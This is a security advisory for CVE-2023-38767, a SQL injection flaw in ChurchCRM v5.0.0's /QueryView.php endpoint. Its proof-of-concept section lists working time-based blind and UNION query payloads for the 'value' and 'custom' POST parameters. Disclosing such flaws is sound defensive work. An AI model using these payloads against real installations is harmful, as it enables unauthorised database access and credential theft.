# CVE-2023-38767 - SQL Injection in /QueryView.php?QueryID=200

|                 |                                                                                      |
| --------------- | --------------- |
| Researchers     | Rowan Crowley                                                               |
| Severity        | TBD                                   |
| Published       | TBD         |
| Software Link   | https://github.com/ChurchCRM/CRM             |

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the 'value' and 'custom' parameters within the /QueryView.php endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the 'value' parameter or 'custom' parameter at the /QueryView.php?QueryID=200 endpoint (CustomSearch query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: value (POST)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: custom=c1&value=1' AND (SELECT 2015 FROM (SELECT(SLEEP(5)))xkmJ) AND 'mTnp'='mTnp&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: custom=c1&value=1' UNION ALL SELECT NULL,CONCAT(0x716b717171,0x63465169647a4e7570694e4a576e6c786c69445a415149754a424163687a7842544d5a774c446176,0x717a787871)-- -&Submit=Execute Query
        
    Parameter: custom (POST)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: custom=c1 AND (SELECT 4783 FROM (SELECT(SLEEP(5)))bdGN)&value=1&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: custom=c1 UNION ALL SELECT CONCAT(0x716b717171,0x6467487a416359614e6f574462767550586d644c67776d4277576c687458785a784e506b58514e52,0x717a787871),NULL-- -&value=1&Submit=Execute Query

